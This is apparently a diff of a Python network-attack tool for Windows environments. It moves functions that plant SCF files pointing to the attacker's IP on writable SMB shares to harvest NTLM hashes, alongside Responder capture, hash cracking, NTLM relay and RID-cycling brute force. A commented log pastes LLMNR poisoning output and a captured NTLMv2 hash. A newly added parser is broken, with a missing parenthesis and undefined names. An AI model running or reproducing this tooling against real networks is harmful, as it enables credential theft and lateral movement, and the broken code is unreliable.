@@ -92,32 +92,17 @@ def nmap_status_printer(nmap_proc):
             print("[*] Nmap running: {} min".format(str(x)))
         time.sleep(1)
 
-def create_scf():
+def run_nse_scripts(args, hosts, nse_scripts_run):
     '''
-    Creates scf file and smbclient.py commands file
+    Run NSE scripts if they weren't run in supplied Nmap XML file
     '''
-    scf_filename = '@local.scf'
-
-    if not os.path.isfile(scf_filename):
-        scf_data = '[Shell]\r\nCommand=2\r\nIconFile=\\\\{}\\file.ico\r\n[Taskbar]\r\nCommand=ToggleDesktop'.format(get_ip())
-        write_to_file(scf_filename, scf_data, 'w+')
-
-    cwd = os.getcwd()+'/'
-    scf_filepath = cwd+scf_filename
-
-    return scf_filepath
-
-def run_smbclient(server, share_name, action, scf_filepath):
-    '''
-    Run's impacket's smbclient.py for scf file attack
-    '''
-    smb_cmds_filename = 'smb-cmds.txt'
-    smb_cmds_data = 'use {}\n{} {}\nls\nexit'.format(share_name, action, scf_filepath)
-    write_to_file(smb_cmds_filename, smb_cmds_data, 'w+')
-    smbclient_cmd = 'python2 submodules/impacket/examples/smbclient.py {} -f {}'.format(server, smb_cmds_filename)
-    print("[*] Running '{}' with the verb '{}'".format(smbclient_cmd, action))
-    stdout, stderr = Popen(smbclient_cmd.split(), stdout=PIPE, stderr=PIPE).communicate()
-    return stdout, stderr
+    hosts = []
+    if nse_scripts_run == False:
+        if len(hosts) > 0:
+            print("[*] Running missing NSE scripts")
+            report = nmap_scan(hosts)
+            hosts = get_hosts(args, report)
+            return hosts
 
 def get_share(l, share):
     '''
@@ -127,38 +112,6 @@ def get_share(l, share):
     if l.startswith('  \\\\') and '$' not in l:
         share = l.strip()[:-1]
     return share
-
-def write_scf_files(lines, ip, args):
-    '''
-    Writes SCF files to writeable shares based on Nmap smb-enum-shares output
-    '''
-    share = None
-    anon_share_found = False
-    scf_filepath = create_scf()
-
-    for l in lines:
-        share = get_share(l, share)
-        if share:
-            share_folder = share.split('\\')[-1]
-            if 'Anonymous access:' in l or 'Current user access:' in l:
-                access = l.split()[-1]
-                if access == 'READ/WRITE':
-                    anon_share_found = True
-                    print('[+] Writeable share found at: '+share)
-                    print('[*] Attempting to write SCF file to share')
-                    action = 'put'
-                    stdout, stderr = run_smbclient(ip, share_folder, action, scf_filepath)
-                    stdout = stdout.decode('utf-8')
-                    if 'Error:' not in stdout and len(stdout) > 1:
-                        print('[+] Successfully wrote SCF file to: {}'.format(share))
-                        write_to_file('logs/shares-with-SCF.txt', share+'\n', 'a+')
-                    else:
-                        stdout_lines = stdout.splitlines()
-                        for line in stdout_lines:
-                            if 'Error:' in line:
-                                print('[-] Error writing SCF file: \n    '+line.strip())
-    
-    return anon_share_found
 
 def parse_nse(hosts, args):
     '''
@@ -192,6 +145,65 @@ def parse_nse(hosts, args):
     if len(smb_signing_disabled_hosts) > 0:
         for host in smb_signing_disabled_hosts:
             write_to_file('smb-signing-disabled-hosts.txt', host+'\n', 'a+')
+
+def run_smbclient(server, share_name, action, scf_filepath):
+    '''
+    Run's impacket's smbclient.py for scf file attack
+    '''
+    smb_cmds_filename = 'smb-cmds.txt'
+    smb_cmds_data = 'use {}\n{} {}\nls\nexit'.format(share_name, action, scf_filepath)
+    write_to_file(smb_cmds_filename, smb_cmds_data, 'w+')
+    smbclient_cmd = 'python2 submodules/impacket/examples/smbclient.py {} -f {}'.format(server, smb_cmds_filename)
+    print("[*] Running '{}' with the verb '{}'".format(smbclient_cmd, action))
+    stdout, stderr = Popen(smbclient_cmd.split(), stdout=PIPE, stderr=PIPE).communicate()
+    return stdout, stderr
+
+def write_scf_files(lines, ip, args):
+    '''
+    Writes SCF files to writeable shares based on Nmap smb-enum-shares output
+    '''
+    share = None
+    anon_share_found = False
+    scf_filepath = create_scf()
+
+    for l in lines:
+        share = get_share(l, share)
+        if share:
+            share_folder = share.split('\\')[-1]
+            if 'Anonymous access:' in l or 'Current user access:' in l:
+                access = l.split()[-1]
+                if access == 'READ/WRITE':
+                    anon_share_found = True
+                    print('[+] Writeable share found at: '+share)
+                    print('[*] Attempting to write SCF file to share')
+                    action = 'put'
+                    stdout, stderr = run_smbclient(ip, share_folder, action, scf_filepath)
+                    stdout = stdout.decode('utf-8')
+                    if 'Error:' not in stdout and len(stdout) > 1:
+                        print('[+] Successfully wrote SCF file to: {}'.format(share))
+                        write_to_file('logs/shares-with-SCF.txt', share+'\n', 'a+')
+                    else:
+                        stdout_lines = stdout.splitlines()
+                        for line in stdout_lines:
+                            if 'Error:' in line:
+                                print('[-] Error writing SCF file: \n    '+line.strip())
+    
+    return anon_share_found
+
+def create_scf():
+    '''
+    Creates scf file and smbclient.py commands file
+    '''
+    scf_filename = '@local.scf'
+
+    if not os.path.isfile(scf_filename):
+        scf_data = '[Shell]\r\nCommand=2\r\nIconFile=\\\\{}\\file.ico\r\n[Taskbar]\r\nCommand=ToggleDesktop'.format(get_ip())
+        write_to_file(scf_filename, scf_data, 'w+')
+
+    cwd = os.getcwd()+'/'
+    scf_filepath = cwd+scf_filename
+
+    return scf_filepath
 
 def local_scf_cleanup():
     '''
@@ -796,6 +808,7 @@ def get_and_crack_resp_hashes(args, prev_creds, prev_lines, identifier):
     Avoids getting and cracking previous hashes
     '''
     new_lines = []
+    ip = None
 
     if 'crack' not in args.skip.lower():
         prev_creds, hashes = get_resp_hashes(prev_creds)
@@ -810,12 +823,34 @@ def get_and_crack_resp_hashes(args, prev_creds, prev_lines, identifier):
             for line in contents:
                 if line not in prev_lines:
                     new_lines.append(line)
-                    print('    [Responder] '+line.strip())
+                    line = line.strip()
+                    print('    [Responder] '+line
+                    ip = parse_responder_lines(client_found, line)
 
     # We don't want a separate john proc for each hash so we wait 10s between checks
     time.sleep(10)
 
     return prev_creds, new_lines
+
+def parse_responder(client_found, line):
+    '''
+    Parse responder to get usernames and IPs for 2 pw bruteforcing
+    '''
+    client_id = ' Client   : '
+    username_id = ' Username : '
+
+    if client_found == True:
+        if username_id in line:
+            client_found = False
+            username = line.split(username_id)[-1].strip()
+            # DO BRUTE HERE
+        else:
+            print('[-] Error parsing Responder-Session.log: why is client_found == True but this line is not " Username : "??')
+
+    if client in line:
+        ip = line.split(client_id)[-1].strip()
+
+    return ip
 
 def cleanup_resp(resp_proc, prev_creds):
     '''
@@ -878,51 +913,6 @@ def parse_ntlmrelay_line(identifier, line, successful_auth, prev_creds, args):
             log_pwds([host_user_pwd])
 
     return prev_creds, successful_auth
-
-def remote_scf_cleanup():
-    '''
-    Deletes the scf file from the remote shares
-    '''
-    path = 'logs/shares-with-SCF.txt'
-    if os.path.isfile(path):
-        with open(path) as f:
-            lines = f.readlines()
-            for l in lines:
-                # Returns '['', '', '10.1.1.0', 'path/to/share\n']
-                split_line = l.split('\\', 3)
-                ip = split_line[2]
-                share_folder = split_line[3].strip()
-                action = 'rm'
-                scf_filepath = '@local.scf'
-                stdout, stderr = run_smbclient(ip, share_folder, action, scf_filepath)
-
-def cleanup_hash_files():
-    '''
-    Puts all the hash files of each type into one file
-    '''
-    ntlm_files = []
-    for fname in os.listdir(os.getcwd()):
-        if re.search('NTLMv(1|2)-hashes-.*\.txt', fname):
-            ntlm_files.append(fname)
-
-    for fname in os.listdir(os.getcwd()+'/submodules/Responder/logs'):
-        if re.search('v(1|2).*\.txt', fname):
-            ntlm_files.append(fname)
-
-    for fname in ntlm_files:
-        try:
-            if 'v1' in fname:
-                with open(fname) as infile1:
-                    v1_file = open('NTLMv1-hashes.txt', 'a+')
-                    v1_file.write(infile1.read())
-                    os.rename(fname, 'logs/'+fname)
-            elif 'v2' in fname:
-                with open(fname) as infile2:
-                    v2_file = open('NTLMv2-hashes.txt', 'a+')
-                    v2_file.write(infile2.read())
-                    os.rename(fname, 'logs/'+fname)
-        except:
-            continue
 
 def do_ntlmrelay(identifier, prev_creds, args):
     '''
@@ -987,17 +977,51 @@ def check_for_nse_scripts(hosts):
     else:
         return True
 
-def run_nse_scripts(args, hosts, nse_scripts_run):
+def remote_scf_cleanup():
     '''
-    Run NSE scripts if they weren't run in supplied Nmap XML file
+    Deletes the scf file from the remote shares
     '''
-    hosts = []
-    if nse_scripts_run == False:
-        if len(hosts) > 0:
-            print("[*] Running missing NSE scripts")
-            report = nmap_scan(hosts)
-            hosts = get_hosts(args, report)
-            return hosts
+    path = 'logs/shares-with-SCF.txt'
+    if os.path.isfile(path):
+        with open(path) as f:
+            lines = f.readlines()
+            for l in lines:
+                # Returns '['', '', '10.1.1.0', 'path/to/share\n']
+                split_line = l.split('\\', 3)
+                ip = split_line[2]
+                share_folder = split_line[3].strip()
+                action = 'rm'
+                scf_filepath = '@local.scf'
+                stdout, stderr = run_smbclient(ip, share_folder, action, scf_filepath)
+
+def cleanup_hash_files():
+    '''
+    Puts all the hash files of each type into one file
+    '''
+    ntlm_files = []
+    for fname in os.listdir(os.getcwd()):
+        if re.search('NTLMv(1|2)-hashes-.*\.txt', fname):
+            ntlm_files.append(fname)
+
+    for fname in os.listdir(os.getcwd()+'/submodules/Responder/logs'):
+        if re.search('v(1|2).*\.txt', fname):
+            ntlm_files.append(fname)
+
+    for fname in ntlm_files:
+        try:
+            if 'v1' in fname:
+                with open(fname) as infile1:
+                    v1_file = open('NTLMv1-hashes.txt', 'a+')
+                    v1_file.write(infile1.read())
+                    os.rename(fname, 'logs/'+fname)
+            elif 'v2' in fname:
+                with open(fname) as infile2:
+                    v2_file = open('NTLMv2-hashes.txt', 'a+')
+                    v2_file.write(infile2.read())
+                    os.rename(fname, 'logs/'+fname)
+        except:
+            continue
+
 
 def main(report, args):
     '''
@@ -1027,7 +1051,7 @@ def main(report, args):
 
         for h in hosts:
             print('[+] SMB open: {}'.format(h.address))
-    
+
         # ATTACK 1: RID Cycling into reverse bruteforce
         if 'rid' not in args.skip.lower():
             prev_creds += smb_reverse_brute(loop, hosts, args, passwords)
@@ -1063,7 +1087,6 @@ def main(report, args):
     if 'relay' not in args.skip.lower() and len(hosts) > 0:
         do_ntlmrelay(identifier, prev_creds, args)
 
-
 if __name__ == "__main__":
     args = parse_args()
     if os.geteuid():
@@ -1075,6 +1098,16 @@ if __name__ == "__main__":
 # WHERE I LEFT OFF
     # TO DO
     # why does john not crack the hashes responder captured on marcello's network; check phone pictures for paste
-    # quick 2 password bruteforce on responder usernames
-    # No null sessions?
 
+#    # quick 2 password bruteforce on responder usernames
+#01/04/2018 10:36:46 PM - [*] [LLMNR]  Poisoned answer sent to 10.1.0.97 for name fdsfdsffdfffFDFDfdsafdfdf
+#01/04/2018 10:36:47 PM - [*] Skipping previously captured hash for LAB\dan.da
+#01/04/2018 10:36:47 PM - [*] Skipping previously captured hash for LAB\dan.da
+#01/04/2018 10:36:53 PM - [*] [LLMNR]  Poisoned answer sent to 10.1.0.97 for name fdsfdsffdfffFDFDfdsafdfdf
+#01/04/2018 10:36:55 PM - [SMBv2] NTLMv2-SSP Client   : 10.1.0.97
+#01/04/2018 10:36:55 PM - [SMBv2] NTLMv2-SSP Username : LAB\me
+#01/04/2018 10:36:55 PM - [SMBv2] NTLMv2-SSP Hash     : me::LAB:4408ea9ea58cb4fd:C4828263E213E1243EE286E5BBC0D981:0101000000000000C0653150DE09D20169FBA08A845E70F6000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000C64FC9FA1A1FBC490AF573DFAE78E3766AD131888F77120D8DDFD12A1530CA460A0010000000000000000000000000000000000009003C0063006900660073002F006600640073006600640073006600660064006600660066004600440046004400660064007300610066006400660064006600000000000000000000000000
+#01/04/2018 10:36:55 PM - [*] [LLMNR]  Poisoned answer sent to 10.1.0.97 for name fdsfdsffdffffdfdfdsafdfdf
+#
+
+    #  left off line 846
